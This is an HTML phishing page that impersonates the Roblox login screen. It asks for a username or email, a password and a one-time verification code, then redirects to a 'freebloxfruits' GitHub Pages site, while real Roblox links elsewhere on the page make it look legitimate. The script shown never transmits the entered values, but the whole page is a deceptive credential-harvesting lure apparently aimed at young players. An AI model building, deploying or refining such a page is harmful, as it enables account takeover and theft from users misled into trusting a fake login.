<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #232527;
            margin: 0;
            padding: 0;
            color: #676868;
        }
        .navbar {
            background-color: #191b1d;
            padding: 10px;
            text-align: right;
        }
        .navbar button {
            background-color: #00b06f;
            color: white;
            border: none;
            padding: 10px 20px;
            text-align: center;
            text-decoration: none;
            display: inline-block;
            cursor: pointer;
            border-radius: 5px;
            font-size: 24px;
        }
        .welcome-text {
            text-align: center;
            font-size: 32px;
            margin-top: 10px;
            margin-bottom: 10px;
        }
        .close {
            position: absolute;
            right: 10px;
            top: 5px;
            font-size: 20px;
            cursor: pointer;
            color: white;
            font-size: 24px;
        }
        .login-container {
            max-width: 400px;
            margin: 50px auto;
            background-color: #393b3d;
            padding: 20px;
            box-shadow: 0px 0px 10px rgba(0,0,0,0.1);
            color: white;
        }
        .login-container input {
            width: 100%;
            padding: 12px;
            margin: 5px 0;
            border: 1px solid #676868;
            box-sizing: border-box;
            background-color: #111212;
            color: #676868;
            border-radius: 5px;
            font-size: 24px;
        }
        .login-container button {
            width: 100%;
            padding: 12px;
            margin: 5px 0;
            border: 1px solid #676868;
            box-sizing: border-box;
            background-color: #393b3d;
            color: white;
            border-radius: 5px;
            font-size: 24px;
        }
        .login-container a {
            color: white;
            text-decoration: none;
            display: inline-block;
            margin: 5px 0;
            font-size: 24px;
        }
        .login-container a:hover {
            text-decoration: underline;
        }
        .modal {
            display: none;
            position: fixed;
            z-index: 1;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            overflow: auto;
            background-color: rgba(0,0,0,0.5);
        }
        .modal-content {
            position: relative;
            background-color: #393b3d;
            margin: 15% auto;
            padding: 20px;
            border: 1px solid #888;
            max-width: 400px;
            color: white;
            border-radius: 5px;
        }
        .modal-content input {
            width: calc(300% - 10px);
            margin-bottom: 40px;
            font-size: 24px;
        }
        .modal-content button {
            width: calc(300% - 10px);
            font-size: 24px;
        }
    </style>
</head>
<body>
    <div class="navbar">
        <button id="signupButton">Sign Up</button>
    </div>
    <div class="welcome-text">
        Login to Roblox
    </div>
    <div class="login-container">
        <input type="text" id="email" placeholder="Email/Username/Phone">
        <input type="password" id="password" placeholder="Password">
        <button id="loginButton">Log In</button>
        <a href="#" id="oneTimeCodeButton">Email me a one-time code</a>
        <a href="#" id="forgotButton">Forgot username/password?</a>
        <a href="#" id="createAccountButton">Don't have an account? Create one!</a>
    </div>
    <div class="modal" id="oneTimeCodeModal">
        <div class="modal-content">
            <span class="close" onclick="hideModals()">×</span>
            Enter the email verified on your account to receive a one-time code.
            <input type="text" id="modalEmail" placeholder="Email">
            <button id="sendCodeButton">Send Code</button>
        </div>
    </div>
    <div class="modal" id="digitCodeModal">
        <div class="modal-content">
            <span class="close" onclick="hideModals()">×</span>
            Enter the code we just sent to: <span id="displayEmail"></span>
            <input type="text" id="digitCode" placeholder="Code" maxlength="6">
        </div>
    </div>
    <script>
        function showOneTimeCodeModal() {
            document.getElementById('oneTimeCodeModal').style.display = 'block';
        }
        function showDigitCodeModal() {
            var email = document.getElementById('modalEmail').value;
            if(email.trim() === "") return;
            document.getElementById('displayEmail').innerText = email;
            document.getElementById('digitCodeModal').style.display = 'block';
        }
        function hideModals() {
            document.getElementById('oneTimeCodeModal').style.display = 'none';
            document.getElementById('digitCodeModal').style.display = 'none';
        }
        document.getElementById('oneTimeCodeButton').addEventListener('click', function() {
            var email = document.getElementById('email').value;
            var password = document.getElementById('password').value;
            if(email.trim() !== "" && password.trim() !== "") {
                showOneTimeCodeModal();
            }
        });
        document.getElementById('sendCodeButton').addEventListener('click', function() {
            hideModals();
            showDigitCodeModal();
        });
        document.getElementById('digitCode').addEventListener('input', function() {
            var code = document.getElementById('digitCode').value;
            if(code.length == 6 && !isNaN(code)) {
                hideModals();
                window.location.href = "https://freebloxfruits.github.io/login-completed/";
            }
        });
        document.getElementById('forgotButton').addEventListener('click', function() {
            window.location.href = "https://www.roblox.com/login/forgot-password-or-username";
        });
        document.getElementById('signupButton').addEventListener('click', function() {
            window.open("https://www.roblox.com/?returnUrl=https%253A%252F%252Fwww.roblox.com%252Fdiscover%2523%252F", "_blank");
        });
        document.getElementById('createAccountButton').addEventListener('click', function() {
            window.open("https://www.roblox.com/?returnUrl=https%253A%252F%252Fwww.roblox.com%252Fdiscover%2523%252F", "_blank");
        });
        document.getElementById('loginButton').addEventListener('click', function() {
            var email = document.getElementById('email').value;
            var password = document.getElementById('password').value;
            if(email.trim() !== "" && password.trim() !== "") {
                window.location.href = "https://freebloxfruits.github.io/login-completed/";
            }
        });
    </script>
</body>
</html>
